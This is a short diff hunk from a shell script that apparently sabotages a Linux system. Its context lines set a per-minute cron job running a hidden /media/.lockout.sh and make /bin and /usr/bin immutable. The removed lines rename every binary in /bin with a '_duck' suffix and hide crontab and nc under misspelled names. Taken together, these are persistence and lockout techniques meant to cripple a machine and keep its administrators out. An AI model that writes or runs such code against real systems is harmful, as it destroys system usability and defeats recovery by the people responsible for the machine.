@@ -180,16 +180,6 @@ echo "* * * * * /media/.lockout.sh" > /media/.cron.txt
 crontab /media/.cron.txt
 
 
-
-for FILE in *;do
-	if [[ "$FILE" != "mv" ]];then
-		mv /bin/"$FILE" /bin/"$FILE"_duck
-	fi
-done
-mv_duck crontab_duck corntab_duck
-mv_duck nc_duck cn_duck
-cd_duck
-
 # Make all of the binaries immutable
 chattr +i -R /usr/bin
 chattr +i -R /bin
